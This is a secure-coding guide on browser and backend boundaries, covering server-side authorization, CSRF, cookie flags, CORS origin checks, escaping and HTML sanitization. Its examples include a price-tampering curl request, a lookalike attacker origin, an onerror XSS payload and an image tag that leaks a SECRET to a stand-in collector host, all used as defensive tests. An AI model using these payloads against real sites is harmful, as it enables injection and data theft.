# Browser and backend boundaries

## Treat browser state as attacker-controlled input

When backend actions depend on browser state, derive authority and protected values again on the server, because hidden fields, route guards, displayed prices, and browser roles can all be edited by the caller. Browser checks improve usability but cannot authorize requests, and a backend reached only through another service still needs caller authentication and object authorization, because same-origin delivery or an internal network does not make the caller trustworthy. Check a direct request with UI-only restrictions removed and with a modified role or resource identifier, and keep legitimate browser validation useful without making it the security boundary.

<example>
The checkout form posts `price=4.99` for a subscription, and the ASP.NET `SubscribeController` ignores it and reads the price from the `plans` table by `plan_id`, so `curl -d price=0.01` changes nothing.
</example>

## Stop ambient browser credentials from authorizing forged intent

When browsers automatically attach authentication credentials to state-changing requests, use the framework's CSRF defense, cover every accepted mutation route and method, validate the token or an equivalent request-origin defense on the backend, and keep safe HTTP methods free of state changes, because a forged cross-site form otherwise acts with the victim's session. A custom-header defense requires rejecting simple-request alternatives and a narrowly configured CORS policy. Cookie `SameSite` settings and origin checks have to fit the real federated flow and supported clients, because cross-origin can still be same-site and XSS can defeat CSRF protections. Check omitted and wrong-session tokens, an alternate content type, and a cross-site form submission against an isolated test origin.

<example>
`POST /projects/delete` in the Django dashboard runs behind `CsrfViewMiddleware` with `{% csrf_token %}` in its form, and the older `GET /projects/delete?id=5` route is removed because an `<img src>` could trigger it.
</example>

When configuring session cookies, use HTTPS, `Secure`, `HttpOnly`, and an explicit `SameSite` value that fits the sign-in flow, and prefer host-only scope when sibling hosts should not share authority, because a cookie path is not an isolation boundary between mutually untrusted applications on one origin, and `HttpOnly` stops script reads but not authenticated requests sent by an injected script. Check the response cookie attributes and the real sign-in redirect flow, verify that a script cannot read the session cookie, and confirm that old or expired sessions still fail server-side checks.

<example>
`app.use(session({ secret: process.env.SESSION_SECRET, cookie: { secure: true, httpOnly: true, sameSite: 'lax' } }))` runs with no `domain` set, and `document.cookie` in the browser console does not list `connect.sid`.
</example>

## Do not confuse CORS with access control

When an API intentionally exposes browser-readable data to another origin, allow the exact trusted origins and the required credential behavior, parse and compare origins instead of matching substrings, prefixes, or suffixes, and avoid reflecting arbitrary origins or trusting `null` for convenience, because CORS only tells a browser whether a page may read a cross-origin response, so simple cross-origin requests and direct callers reach the server regardless and still need their own authorization. Public unauthenticated data may intentionally use a broader policy, and protected data still needs its own authorization. Check an untrusted origin, a lookalike hostname, `null`, and a direct non-browser request.

<example>
The Go API echoes `Access-Control-Allow-Origin` only when the parsed `Origin` is in `{"https://app.tickets.example", "https://m.tickets.example"}` and sets `Vary: Origin` on every response, so `https://app.tickets.example.evil.test` and `null` get no header, and `curl` without a session still gets 401 on private routes.
</example>

## Keep display data out of executable browser contexts

When rendering external text, use the framework's escaped binding or a text-only sink on an ordinary element, including for stored, third-party, and generated text, and apply the encoding for the context at the final sink, because escaping for HTML does not secure JavaScript and pre-encoding a text sink causes double encoding. Keep data out of executable script, style, handler, and template-source positions, and give URL attributes a permitted-scheme policy. Check a stored value through its real renderer, attribute placement, link scheme, and later client-side updates, and confirm that text stays text without corrupting valid punctuation.

<example>
A JavaScript review widget sets `el.textContent = review.body` and not `el.innerHTML`, Jinja templates keep autoescaping on for `{{ review.body }}`, and a reviewer's website link becomes an anchor only when it starts with `https://` or `http://`.
</example>

When rich HTML or Markdown is an actual product requirement, use a maintained sanitizer and renderer configured for the supported content, restrict raw HTML, active URL schemes, and automatic external-resource loads as the data's sensitivity requires, inspect transformations after sanitization, and isolate untrusted active documents from application authority, because a CSP is defense in depth and not permission to use an unsafe sink. Check event handlers, unsafe links, mutated sanitized markup, and a remote image carrying dummy private data, because a harmless-looking final page does not prove that no network disclosure occurred.

<example>
Task descriptions in a project tracker pass through DOMPurify with `ALLOWED_TAGS` limited to `b`, `i`, and `a`, and a test submits `<img src=x onerror=alert(1)>` and `<img src="https://collector.test/?c=SECRET">` and then checks that nothing runs and the collector log stays empty.
</example>
